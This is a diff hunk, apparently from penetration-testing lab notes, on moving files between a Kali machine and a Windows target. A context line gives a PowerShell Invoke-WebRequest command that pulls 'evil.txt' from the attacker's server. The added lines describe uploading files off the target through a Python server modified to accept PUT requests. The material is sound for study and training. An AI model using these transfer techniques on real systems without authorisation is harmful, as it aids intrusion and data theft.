@@ -94,6 +94,9 @@ Or as a one liner, executing the requested payload remotely rather than saving a
 To use Invoke-WebRequest to download a file from our Kali server we can use the following command (note the shorthand IWR which is used in place of the full command Invoke-WebRequest)
 `powershell IWR -uri http://192.168.119.130:9002/evil.txt -OutFile evil_IWR.txt`
 
+In order to upload files I will be using a simple python script which modifies the SimpleHTTPServer python module in order to accept PUT requests. From here we can modify our Invoke-WebRequest command to upload (or "put") files.
+
+
 
 **4.  Use TFTP to transfer files from a non-interactive shell from Kali to Windows.**
 
